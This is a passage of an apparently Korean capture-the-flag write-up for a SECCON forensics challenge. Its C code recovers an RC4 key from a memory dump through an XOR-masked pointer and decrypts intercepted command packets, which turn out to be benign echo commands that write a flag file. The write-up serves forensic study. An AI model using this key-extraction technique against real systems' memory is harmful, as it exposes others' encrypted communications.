class="mh">0x6a</span><span class="p">,</span> <span class="mh">0xeb</span><span class="p">,</span><span class="mh">0x65</span><span class="p">,</span> <span class="mh">0xb7</span><span class="p">,</span> <span class="mh">0xf7</span><span class="p">,</span> <span class="mh">0xf4</span><span class="p">,</span> <span class="mh">0xd1</span><span class="p">,</span> <span class="mh">0xd0</span><span class="p">,</span> <span class="mh">0xbc</span><span class="p">,</span> <span class="mh">0x6c</span><span class="p">,</span><span class="mh">0xee</span><span class="p">,</span> <span class="mh">0xc5</span><span class="p">,</span> <span class="mh">0x21</span><span class="p">,</span> <span class="mh">0xc7</span><span class="p">,</span> <span class="mh">0x7c</span><span class="p">,</span> <span class="mh">0x27</span><span class="p">,</span> <span class="mh">0xcd</span><span class="p">,</span> <span class="mh">0x0f</span><span class="p">,</span><span class="mh">0xfb</span><span class="p">,</span> <span class="mh">0xa4</span><span class="p">,</span> <span class="mh">0xa9</span><span class="p">,</span> <span class="mh">0xd0</span><span class="p">,</span> <span class="mh">0x07</span><span class="p">,</span> <span class="mh">0x22</span><span class="p">,</span> <span class="mh">0x8c</span><span class="p">,</span> <span class="mh">0x47</span><span class="p">,</span><span class="mh">0x82</span><span class="p">,</span> <span class="mh">0x88</span><span class="p">,</span> <span class="mh">0xb9</span><span class="p">,</span> <span class="mh">0x06</span><span class="p">,</span> <span class="mh">0xb6</span><span class="p">,</span> <span class="mh">0x4d</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">,</span> <span class="mh">0x2b</span><span class="p">,</span><span class="mh">0xe9</span><span class="p">,</span> <span class="mh">0x82</span><span class="p">,</span> <span class="mh">0x2e</span><span class="p">,</span> <span class="mh">0x12</span><span class="p">,</span> <span class="mh">0x3e</span><span class="p">,</span> <span class="mh">0xc4</span><span class="p">,</span> <span class="mh">0xa5</span><span class="p">,</span> <span class="mh">0xab</span><span class="p">,</span><span class="mh">0xbc</span><span class="p">,</span> <span class="mh">0x15</span><span class="p">,</span> <span class="mh">0x5a</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0xb6</span><span class="p">,</span> <span class="mh">0x3a</span><span class="p">,</span> <span class="mh">0x8c</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span><span class="mh">0x7c</span><span class="p">,</span> <span class="mh">0x05</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0x61</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x12</span><span class="p">,</span> <span class="mh">0x4f</span> <span class="p">};</span>
<span class="n">BYTE</span> <span class="n">cmd2_length</span> <span class="o">=</span> <span class="mh">0x66</span><span class="p">;</span><span class="c1">// [] = { /* Packet 315 */                 // 7. cmd 2 length</span>
<span class="n">BYTE</span> <span class="n">cmd2</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="cm">/* Packet 316 */</span>                 <span class="c1">// 8. cmd 2</span>
<span class="mh">0x8c</span><span class="p">,</span> <span class="mh">0x28</span><span class="p">,</span> <span class="mh">0xc2</span><span class="p">,</span> <span class="mh">0x0d</span><span class="p">,</span> <span class="mh">0x02</span><span class="p">,</span> <span class="mh">0x7a</span><span class="p">,</span> <span class="mh">0xa8</span><span class="p">,</span> <span class="mh">0xbc</span><span class="p">,</span><span class="mh">0x9a</span><span class="p">,</span> <span class="mh">0x6b</span><span class="p">,</span> <span class="mh">0xd4</span><span class="p">,</span> <span class="mh">0x36</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0x0c</span><span class="p">,</span> <span class="mh">0x1d</span><span class="p">,</span> <span class="mh">0xf7</span><span class="p">,</span><span class="mh">0x3e</span><span class="p">,</span> <span class="mh">0x27</span><span class="p">,</span> <span class="mh">0x14</span><span class="p">,</span> <span class="mh">0xbf</span><span class="p">,</span> <span class="mh">0xab</span><span class="p">,</span> <span class="mh">0xae</span><span class="p">,</span> <span class="mh">0xfb</span><span class="p">,</span> <span class="mh">0x7d</span><span class="p">,</span><span class="mh">0x34</span><span class="p">,</span> <span class="mh">0x06</span><span class="p">,</span> <span class="mh">0x35</span><span class="p">,</span> <span class="mh">0xdf</span><span class="p">,</span> <span class="mh">0x91</span><span class="p">,</span> <span class="mh">0x74</span><span class="p">,</span> <span class="mh">0xe2</span><span class="p">,</span> <span class="mh">0x47</span><span class="p">,</span><span class="mh">0x19</span><span class="p">,</span> <span class="mh">0xdd</span><span class="p">,</span> <span class="mh">0x3b</span><span class="p">,</span> <span class="mh">0xcc</span><span class="p">,</span> <span class="mh">0xe8</span><span class="p">,</span> <span class="mh">0x95</span><span class="p">,</span> <span class="mh">0x72</span><span class="p">,</span> <span class="mh">0xdd</span><span class="p">,</span><span class="mh">0xad</span><span class="p">,</span> <span class="mh">0x49</span><span class="p">,</span> <span class="mh">0xac</span><span class="p">,</span> <span class="mh">0x8c</span><span class="p">,</span> <span class="mh">0x93</span><span class="p">,</span> <span class="mh">0xf1</span><span class="p">,</span> <span class="mh">0x22</span><span class="p">,</span> <span class="mh">0xaa</span><span class="p">,</span><span class="mh">0x61</span><span class="p">,</span> <span class="mh">0xad</span><span class="p">,</span> <span class="mh">0xa3</span><span class="p">,</span> <span class="mh">0xf3</span><span class="p">,</span> <span class="mh">0xcb</span><span class="p">,</span> <span class="mh">0x8a</span><span class="p">,</span> <span class="mh">0xa1</span><span class="p">,</span> <span class="mh">0x28</span><span class="p">,</span><span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0xab</span><span class="p">,</span> <span class="mh">0x33</span><span class="p">,</span> <span class="mh">0x95</span><span class="p">,</span> <span class="mh">0x71</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">,</span> <span class="mh">0xfd</span><span class="p">,</span> <span class="mh">0x04</span><span class="p">,</span><span class="mh">0xc4</span><span class="p">,</span> <span class="mh">0x82</span><span class="p">,</span> <span class="mh">0xa7</span><span class="p">,</span> <span class="mh">0x97</span><span class="p">,</span> <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0x6f</span><span class="p">,</span> <span class="mh">0xf0</span><span class="p">,</span> <span class="mh">0x67</span><span class="p">,</span><span class="mh">0xcc</span><span class="p">,</span> <span class="mh">0xb2</span><span class="p">,</span> <span class="mh">0xb0</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xb6</span><span class="p">,</span> <span class="mh">0x4c</span><span class="p">,</span> <span class="mh">0x9b</span><span class="p">,</span> <span class="mh">0x03</span><span class="p">,</span><span class="mh">0xe5</span><span class="p">,</span> <span class="mh">0x86</span><span class="p">,</span> <span class="mh">0x14</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x15</span><span class="p">,</span> <span class="mh">0xd5</span><span class="p">,</span> <span class="mh">0xbf</span><span class="p">,</span> <span class="mh">0xa6</span><span class="p">,</span><span class="mh">0xa1</span><span class="p">,</span> <span class="mh">0x19</span><span class="p">,</span> <span class="mh">0x4b</span><span class="p">,</span> <span class="mh">0x0c</span><span class="p">,</span> <span class="mh">0xb9</span><span class="p">,</span> <span class="mh">0x39</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">,</span> <span class="mh">0x2c</span><span class="p">,</span><span class="mh">0x26</span><span class="p">,</span> <span class="mh">0x09</span><span class="p">,</span> <span class="mh">0xf3</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">,</span> <span class="mh">0x4f</span><span class="p">,</span> <span class="mh">0x18</span> <span class="p">};</span>
<span class="k">const</span> <span class="n">BYTE</span> <span class="n">g_P</span><span class="p">[]</span> <span class="o">=</span>
<span class="p">{</span>
  <span class="mh">0xED</span><span class="p">,</span> <span class="mh">0xA1</span><span class="p">,</span> <span class="mh">0x53</span><span class="p">,</span> <span class="mh">0x9B</span><span class="p">,</span> <span class="mh">0xD8</span><span class="p">,</span> <span class="mh">0x26</span><span class="p">,</span> <span class="mh">0x05</span><span class="p">,</span> <span class="mh">0x03</span><span class="p">,</span> <span class="mh">0x3A</span><span class="p">,</span> <span class="mh">0x88</span><span class="p">,</span>
  <span class="mh">0x52</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span> <span class="mh">0xF8</span><span class="p">,</span> <span class="mh">0x77</span><span class="p">,</span> <span class="mh">0x54</span><span class="p">,</span> <span class="mh">0xCF</span><span class="p">,</span> <span class="mh">0x1D</span><span class="p">,</span> <span class="mh">0xAB</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="mh">0x3A</span><span class="p">,</span>
  <span class="mh">0xB9</span><span class="p">,</span> <span class="mh">0xB0</span><span class="p">,</span> <span class="mh">0x1F</span><span class="p">,</span> <span class="mh">0xE3</span><span class="p">,</span> <span class="mh">0xA3</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">,</span> <span class="mh">0x4E</span><span class="p">,</span> <span class="mh">0x84</span><span class="p">,</span> <span class="mh">0xB6</span><span class="p">,</span> <span class="mh">0x2F</span><span class="p">,</span>
  <span class="mh">0x02</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x1F</span><span class="p">,</span> <span class="mh">0xE1</span><span class="p">,</span> <span class="mh">0x6E</span><span class="p">,</span> <span class="mh">0x25</span><span class="p">,</span> <span class="mh">0xCD</span><span class="p">,</span> <span class="mh">0xBB</span><span class="p">,</span> <span class="mh">0x74</span><span class="p">,</span> <span class="mh">0x56</span><span class="p">,</span>
  <span class="mh">0x32</span><span class="p">,</span> <span class="mh">0x05</span><span class="p">,</span> <span class="mh">0x02</span><span class="p">,</span> <span class="mh">0x6A</span><span class="p">,</span> <span class="mh">0x8F</span><span class="p">,</span> <span class="mh">0x7B</span><span class="p">,</span> <span class="mh">0x9A</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0x52</span><span class="p">,</span>
  <span class="mh">0x71</span><span class="p">,</span> <span class="mh">0xEE</span><span class="p">,</span> <span class="mh">0xF8</span><span class="p">,</span> <span class="mh">0xA6</span><span class="p">,</span> <span class="mh">0x4B</span><span class="p">,</span> <span class="mh">0x91</span><span class="p">,</span> <span class="mh">0xB1</span><span class="p">,</span> <span class="mh">0x35</span><span class="p">,</span> <span class="mh">0x03</span><span class="p">,</span> <span class="mh">0x76</span><span class="p">,</span>
  <span class="mh">0xC1</span><span class="p">,</span> <span class="mh">0xCE</span><span class="p">,</span> <span class="mh">0x21</span><span class="p">,</span> <span class="mh">0xCF</span>
<span class="p">};</span>
<span class="k">const</span> <span class="n">BYTE</span> <span class="n">g_G</span><span class="p">[]</span> <span class="o">=</span>
<span class="p">{</span>
  <span class="mh">0x14</span><span class="p">,</span> <span class="mh">0xCF</span><span class="p">,</span> <span class="mh">0x6B</span><span class="p">,</span> <span class="mh">0x2F</span><span class="p">,</span> <span class="mh">0xCA</span><span class="p">,</span> <span class="mh">0xE9</span><span class="p">,</span> <span class="mh">0x51</span><span class="p">,</span> <span class="mh">0xA6</span><span class="p">,</span> <span class="mh">0xFD</span><span class="p">,</span> <span class="mh">0x4D</span><span class="p">,</span>
  <span class="mh">0xAB</span><span class="p">,</span> <span class="mh">0xEA</span><span class="p">,</span> <span class="mh">0x92</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span> <span class="mh">0xBB</span><span class="p">,</span> <span class="mh">0xB8</span><span class="p">,</span> <span class="mh">0x3F</span><span class="p">,</span> <span class="mh">0xB4</span><span class="p">,</span> <span class="mh">0x56</span><span class="p">,</span> <span class="mh">0x54</span><span class="p">,</span>
  <span class="mh">0x1B</span><span class="p">,</span> <span class="mh">0x8E</span><span class="p">,</span> <span class="mh">0x7C</span><span class="p">,</span> <span class="mh">0xE7</span><span class="p">,</span> <span class="mh">0x1E</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x02</span><span class="p">,</span> <span class="mh">0x4B</span><span class="p">,</span> <span class="mh">0x44</span><span class="p">,</span>
  <span class="mh">0x7B</span><span class="p">,</span> <span class="mh">0xA3</span><span class="p">,</span> <span class="mh">0x13</span><span class="p">,</span> <span class="mh">0xC8</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">,</span> <span class="mh">0xC0</span><span class="p">,</span> <span class="mh">0x1A</span><span class="p">,</span> <span class="mh">0xDE</span><span class="p">,</span> <span class="mh">0x06</span><span class="p">,</span>
  <span class="mh">0x11</span><span class="p">,</span> <span class="mh">0x6D</span><span class="p">,</span> <span class="mh">0x0D</span><span class="p">,</span> <span class="mh">0xAB</span><span class="p">,</span> <span class="mh">0x93</span><span class="p">,</span> <span class="mh">0x0F</span><span class="p">,</span> <span class="mh">0xAE</span><span class="p">,</span> <span class="mh">0xFB</span><span class="p">,</span> <span class="mh">0x96</span><span class="p">,</span> <span class="mh">0x17</span><span class="p">,</span>
  <span class="mh">0x77</span><span class="p">,</span> <span class="mh">0x86</span><span class="p">,</span> <span class="mh">0x9B</span><span class="p">,</span> <span class="mh">0x7D</span><span class="p">,</span> <span class="mh">0xCD</span><span class="p">,</span> <span class="mh">0x72</span><span class="p">,</span> <span class="mh">0xCE</span><span class="p">,</span> <span class="mh">0x1F</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0x36</span><span class="p">,</span>
  <span class="mh">0x49</span><span class="p">,</span> <span class="mh">0x06</span><span class="p">,</span> <span class="mh">0x79</span><span class="p">,</span> <span class="mh">0x7C</span>
<span class="p">};</span>
<span class="kt">void</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">HCRYPTPROV</span> <span class="n">hCryptProv</span><span class="p">;</span>
    <span class="n">HCRYPTKEY</span> <span class="n">hCryptKey</span><span class="p">,</span><span class="n">key</span><span class="p">;</span>
    <span class="n">DATA_BLOB</span> <span class="n">P</span><span class="p">;</span>
    <span class="n">DATA_BLOB</span> <span class="n">G</span><span class="p">;</span>
    <span class="n">P</span><span class="p">.</span><span class="n">cbData</span> <span class="o">=</span> <span class="mh">0x40</span><span class="p">;</span>
    <span class="n">P</span><span class="p">.</span><span class="n">pbData</span> <span class="o">=</span> <span class="p">(</span><span class="n">BYTE</span><span class="o">*</span><span class="p">)(</span><span class="n">g_P</span><span class="p">);</span>
    <span class="n">G</span><span class="p">.</span><span class="n">cbData</span> <span class="o">=</span> <span class="mh">0x40</span><span class="p">;</span>
    <span class="n">G</span><span class="p">.</span><span class="n">pbData</span> <span class="o">=</span> <span class="p">(</span><span class="n">BYTE</span><span class="o">*</span><span class="p">)(</span><span class="n">g_G</span><span class="p">);</span>
    <span class="n">DWORD</span> <span class="n">Size_4</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="n">DWORD</span> <span class="n">pbData</span> <span class="o">=</span> <span class="mh">0x6801</span><span class="p">;</span>

    <span class="n">CryptAcquireContext</span><span class="p">(</span><span class="o">&amp;</span><span class="n">hCryptProv</span><span class="p">,</span><span class="nb">NULL</span><span class="p">,</span><span class="n">TEXT</span><span class="p">(</span><span class="s">"Microsoft Enhanced DSS and Diffie-Hellman Cryptographic Provider"</span><span class="p">),</span><span class="mi">13</span><span class="p">,</span><span class="mh">0xf0000000</span><span class="p">);</span>
    <span class="n">CryptGenKey</span><span class="p">(</span><span class="n">hCryptProv</span><span class="p">,</span> <span class="mh">0xaa02</span><span class="p">,</span> <span class="mh">0x2000041</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">hCryptKey</span><span class="p">);</span>
    <span class="n">CryptSetKeyParam</span><span class="p">(</span><span class="n">hCryptKey</span><span class="p">,</span> <span class="n">KP_P</span><span class="p">,</span> <span class="p">(</span><span class="n">PBYTE</span><span class="p">)</span><span class="o">&amp;</span><span class="n">P</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="n">CryptSetKeyParam</span><span class="p">(</span><span class="n">hCryptKey</span><span class="p">,</span> <span class="n">KP_G</span><span class="p">,</span> <span class="p">(</span><span class="n">PBYTE</span><span class="p">)</span><span class="o">&amp;</span><span class="n">G</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="n">CryptSetKeyParam</span><span class="p">(</span><span class="n">hCryptKey</span><span class="p">,</span> <span class="n">KP_X</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>    
    <span class="n">CryptImportKey</span><span class="p">(</span><span class="n">hCryptProv</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="n">hCryptKey</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">key</span><span class="p">);</span>
    <span class="n">CryptSetKeyParam</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="mi">7u</span><span class="p">,</span> <span class="p">(</span><span class="n">BYTE</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">pbData</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span> <span class="c1">// to RC4</span>

		<span class="cm">/* from ptr-yudai's source */</span>
    <span class="n">BYTE</span> <span class="n">extractedKey</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">241</span><span class="p">,</span> <span class="mi">245</span><span class="p">,</span> <span class="mi">133</span><span class="p">,</span> <span class="mi">160</span><span class="p">,</span> <span class="mi">243</span><span class="p">,</span> <span class="mi">39</span><span class="p">,</span> <span class="mi">135</span><span class="p">,</span> <span class="mi">173</span><span class="p">,</span> <span class="mi">84</span><span class="p">,</span> <span class="mi">192</span><span class="p">,</span> <span class="mi">102</span><span class="p">,</span> <span class="mi">16</span><span class="p">,</span> <span class="mi">175</span><span class="p">,</span> <span class="mi">47</span><span class="p">,</span> <span class="mi">58</span><span class="p">,</span> <span class="mi">163</span> <span class="p">};</span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">enckey</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span><span class="o">*</span><span class="p">)((</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">key</span> <span class="o">+</span> <span class="mh">0x58</span><span class="p">);</span>
    <span class="kt">void</span><span class="o">*</span> <span class="n">ptr_secret</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span><span class="o">*</span><span class="p">)(</span><span class="n">enckey</span> <span class="o">^</span> <span class="mh">0xA2491D83D96214A0ULL</span><span class="p">);</span>
    <span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span> <span class="n">key_p</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span><span class="p">)(</span><span class="o">*</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span><span class="o">*</span><span class="p">)((</span><span class="n">BYTE</span><span class="o">*</span><span class="p">)</span><span class="n">ptr_secret</span> <span class="o">+</span> <span class="mh">0x48</span><span class="p">));</span>
    <span class="n">memcpy</span><span class="p">((</span><span class="n">BYTE</span><span class="o">*</span><span class="p">)</span><span class="n">key_p</span><span class="p">,</span> <span class="n">extractedKey</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">);</span>
		<span class="cm">/* overwrite key from dump file */</span>

		<span class="cm">/* decrypt commands */</span>
    <span class="n">DWORD</span> <span class="n">dwLength</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">CryptDecrypt</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">cmd1</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dwLength</span><span class="p">);</span>
    <span class="n">dwLength</span> <span class="o">=</span> <span class="mh">0x67</span><span class="p">;</span>
    <span class="n">CryptDecrypt</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="mi">0</span><span class="n">i64</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">cmd1</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dwLength</span><span class="p">);</span>
    <span class="n">puts</span><span class="p">((</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">cmd1</span><span class="p">);</span>
    <span class="n">dwLength</span> <span class="o">=</span> <span class="mh">0x66</span><span class="p">;</span>
    <span class="n">CryptDecrypt</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">cmd2</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dwLength</span><span class="p">);</span>
    <span class="n">puts</span><span class="p">((</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">cmd2</span><span class="p">);</span>   
<span class="p">}</span>
</pre></table></code></div></div><p>1,2 번 과정에서 굳이 패킷에 있는 데이터를 쓸 필요가 없다. 그냥 임의로 키교환 하고 RC4 키만 바꾸면 되기때문 풀이에서는 처음에 0을 넣어서 한 번 호출한 뒤 복호화했더니 cmd1, cmd2 복호화된 값이 정상적으로 나왔다. 안그럼 복호화가 이상하게됨</p><p><a href="https://github.com/maldevel/WinRC4/blob/master/WinRC4/rc4.c">https://github.com/maldevel/WinRC4/blob/master/WinRC4/rc4.c</a></p><p>다른 소스에서도 먼저 length 에 0을 넣어 한 번 호출한 뒤 복호화하는데, 아직 이유는 모르겠당</p><blockquote><p>/C echo “SECCON{M3m0ry_Dump+P4ck3t_C4ptur3=S0ph1st1c4t3d_F0r3ns1cs}” &gt; C:\Users\ctf\Desktop\flag.txt</p><p>/C echo “I regret to say that your computer is pwned… :(“ &gt; C:\Users\ctf\Desktop\notification.txt</p></blockquote><hr /><p>ptr-yudai’s wirteup (from discord)</p><div class="language-cpp highlighter-rouge"><div class="code-header"> <span label-text="Cpp"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
</pre><td class="rouge-code"><pre><span class="n">I</span> <span class="n">focused</span> <span class="n">on</span> <span class="n">analysing</span> <span class="n">RC4</span> <span class="n">key</span> <span class="n">generation</span> <span class="n">rather</span> <span class="n">than</span> <span class="n">the</span> <span class="n">encrypted</span> <span class="n">DH</span> <span class="n">key</span><span class="p">.</span>
<span class="n">So</span><span class="p">...</span> <span class="n">unfortunately</span> <span class="n">I</span> <span class="n">don</span><span class="err">'</span><span class="n">t</span> <span class="n">know</span> <span class="n">what</span> <span class="n">kind</span> <span class="n">of</span> <span class="n">encryption</span> <span class="n">is</span> <span class="n">used</span> <span class="k">for</span> <span class="n">DH</span><span class="p">.</span>

<span class="n">There</span> <span class="n">is</span> <span class="n">a</span> <span class="n">magic</span> <span class="n">number</span> <span class="n">in</span> <span class="n">the</span> <span class="n">key</span> <span class="n">store</span> <span class="p">(</span><span class="n">as</span> <span class="n">far</span> <span class="n">as</span> <span class="n">I</span> <span class="n">remember</span> <span class="n">it</span> <span class="n">was</span> <span class="n">ba</span> <span class="n">df</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span><span class="p">).</span>
<span class="n">My</span> <span class="n">intended</span> <span class="n">solution</span> <span class="n">is</span>

<span class="mf">1.</span> <span class="n">Search</span> <span class="k">for</span> <span class="n">magic</span> <span class="n">number</span> <span class="n">in</span> <span class="n">memory</span>
<span class="mf">2.</span> <span class="n">If</span> <span class="n">offset</span> <span class="o">+</span><span class="mx">58h</span> <span class="n">has</span> <span class="n">XORed</span> <span class="n">pointer</span><span class="p">,</span> <span class="n">it</span><span class="err">'</span><span class="n">s</span> <span class="n">pointing</span> <span class="n">to</span> <span class="n">RC4</span> <span class="n">key</span>
<span class="mf">3.</span> <span class="n">The</span> <span class="n">RC4</span> <span class="n">key</span> <span class="n">has</span> <span class="n">pointer</span> <span class="n">to</span> <span class="n">the</span> <span class="n">actualy</span> <span class="n">key</span> <span class="p">(</span><span class="o">?</span><span class="p">)</span> <span class="n">bytearray</span><span class="p">.</span> <span class="p">(</span><span class="n">xor</span> <span class="n">key</span> <span class="n">is</span> <span class="mh">0xA2491D83D96214A0</span><span class="p">,</span> <span class="n">found</span> <span class="n">by</span> <span class="n">reversing</span> <span class="n">credential</span> <span class="n">provider</span><span class="err">'</span><span class="n">s</span> <span class="n">dll</span><span class="p">)</span>
<span class="mf">4.</span> <span class="n">Extract</span> <span class="n">RC4</span> <span class="n">key</span><span class="p">.</span>

<span class="n">Now</span> <span class="n">you</span> <span class="n">can</span> <span class="n">decrypt</span> <span class="n">the</span> <span class="n">data</span> <span class="n">by</span>

<span class="n">a</span><span class="p">.</span> <span class="n">Create</span> <span class="n">random</span> <span class="n">RC4</span> <span class="n">key</span> <span class="n">and</span> <span class="n">get</span> <span class="n">the</span> <span class="n">pointer</span> <span class="p">(</span><span class="n">handle</span><span class="p">).</span>
<span class="n">b</span><span class="p">.</span> <span class="n">Follow</span> <span class="mi">2</span><span class="p">,</span><span class="mi">3</span>
<span class="n">c</span><span class="p">.</span> <span class="n">Replace</span> <span class="n">the</span> <span class="n">key</span> <span class="n">with</span> <span class="n">the</span> <span class="n">key</span> <span class="n">extracted</span> <span class="n">in</span> <span class="n">step</span> <span class="mi">4</span>
<span class="n">d</span><span class="p">.</span> <span class="n">Decrypt</span> <span class="n">the</span> <span class="n">message</span><span class="p">.</span>

<span class="cp">#include &lt;windows.h&gt;
#include &lt;bcrypt.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
#define DHKEYSIZE 512
</span>
<span class="k">static</span> <span class="k">const</span> <span class="n">BYTE</span> <span class="n">g_P</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
  <span class="mh">0xed</span><span class="p">,</span> <span class="mh">0xa1</span><span class="p">,</span> <span class="mh">0x53</span><span class="p">,</span> <span class="mh">0x9b</span><span class="p">,</span> <span class="mh">0xd8</span><span class="p">,</span> <span class="mh">0x26</span><span class="p">,</span> <span class="mh">0x05</span><span class="p">,</span> <span class="mh">0x03</span><span class="p">,</span>
  <span class="mh">0x3a</span><span class="p">,</span> <span class="mh">0x88</span><span class="p">,</span> <span class="mh">0x52</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span> <span class="mh">0xf8</span><span class="p">,</span> <span class="mh">0x77</span><span class="p">,</span> <span class="mh">0x54</span><span class="p">,</span> <span class="mh">0xcf</span><span class="p">,</span>
  <span class="mh">0x1d</span><span class="p">,</span> <span class="mh">0xab</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="mh">0x3a</span><span class="p">,</span> <span class="mh">0xb9</span><span class="p">,</span> <span class="mh">0xb0</span><span class="p">,</span> <span class="mh">0x1f</span><span class="p">,</span> <span class="mh">0xe3</span><span class="p">,</span>
  <span class="mh">0xa3</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">,</span> <span class="mh">0x4e</span><span class="p">,</span> <span class="mh">0x84</span><span class="p">,</span> <span class="mh">0xb6</span><span class="p">,</span> <span class="mh">0x2f</span><span class="p">,</span> <span class="mh">0x02</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span>
  <span class="mh">0x1f</span><span class="p">,</span> <span class="mh">0xe1</span><span class="p">,</span> <span class="mh">0x6e</span><span class="p">,</span> <span class="mh">0x25</span><span class="p">,</span> <span class="mh">0xcd</span><span class="p">,</span> <span class="mh">0xbb</span><span class="p">,</span> <span class="mh">0x74</span><span class="p">,</span> <span class="mh">0x56</span><span class="p">,</span>
  <span class="mh">0x32</span><span class="p">,</span> <span class="mh">0x05</span><span class="p">,</span> <span class="mh">0x02</span><span class="p">,</span> <span class="mh">0x6a</span><span class="p">,</span> <span class="mh">0x8f</span><span class="p">,</span> <span class="mh">0x7b</span><span class="p">,</span> <span class="mh">0x9a</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span>
  <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0x52</span><span class="p">,</span> <span class="mh">0x71</span><span class="p">,</span> <span class="mh">0xee</span><span class="p">,</span> <span class="mh">0xf8</span><span class="p">,</span> <span class="mh">0xa6</span><span class="p">,</span> <span class="mh">0x4b</span><span class="p">,</span> <span class="mh">0x91</span><span class="p">,</span>
  <span class="mh">0xb1</span><span class="p">,</span> <span class="mh">0x35</span><span class="p">,</span> <span class="mh">0x03</span><span class="p">,</span> <span class="mh">0x76</span><span class="p">,</span> <span class="mh">0xc1</span><span class="p">,</span> <span class="mh">0xce</span><span class="p">,</span> <span class="mh">0x21</span><span class="p">,</span> <span class="mh">0xcf</span>
<span class="p">};</span>

<span class="k">static</span> <span class="k">const</span> <span class="n">BYTE</span> <span class="n">g_G</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
